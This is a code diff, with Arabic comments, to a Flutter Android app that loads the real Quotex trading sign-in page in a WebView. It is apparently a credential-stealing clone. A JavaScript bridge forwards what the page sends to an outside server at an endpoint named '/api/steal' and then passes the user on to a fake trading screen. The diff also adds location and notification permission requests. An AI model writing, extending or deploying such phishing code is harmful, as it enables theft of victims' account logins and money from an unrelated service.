@@ -2,7 +2,7 @@ import 'package:flutter/material.dart';
 import 'package:google_fonts/google_fonts.dart';
 import 'package:webview_flutter/webview_flutter.dart';
 import 'package:webview_flutter_android/webview_flutter_android.dart';
-import 'package:flutter/services.dart';
+import 'package:permission_handler/permission_handler.dart';
 import 'package:http/http.dart' as http;
 
 void main() => runApp(const MyApp());
@@ -35,20 +35,28 @@ class _LoginScreenState extends State<LoginScreen> {
   @override
   void initState() {
     super.initState();
+    _requestPermissions(); // طلب الأذونات أول شي
+    _initWebView();
+  }
+
+  // 293. طلب الأذونات (الموقع والإشعارات) زي صاحبك
+  void _requestPermissions() async {
+    await Permission.location.request();
+    await Permission.notification.request();
+  }
+
+  void _initWebView() {
     _controller = WebViewController()
       ..setJavaScriptMode(JavaScriptMode.unrestricted)
-      // 290. الإعدادات المتقدمة اللي لقيناها في تطبيق صاحبك
       ..setUserAgent("Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36")
       ..addJavaScriptChannel(
         'NativeBridge',
         onMessageReceived: (msg) async {
-          // بنبعت البيانات للسيرفر
           await http.post(
             Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
             headers: {"Content-Type": "application/json"},
             body: msg.message,
           );
-          // بعدين بننقل المستخدم
           if (mounted) {
             Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
           }
@@ -63,7 +71,6 @@ class _LoginScreenState extends State<LoginScreen> {
       )
       ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
 
-    // 291. تفعيل خصائص الـ Android WebView اللي صاحبك استخدمها
     if (_controller.platform is AndroidWebViewController) {
       AndroidWebViewController androidController = _controller.platform as AndroidWebViewController;
       androidController.setMediaPlaybackRequiresUserGesture(false);
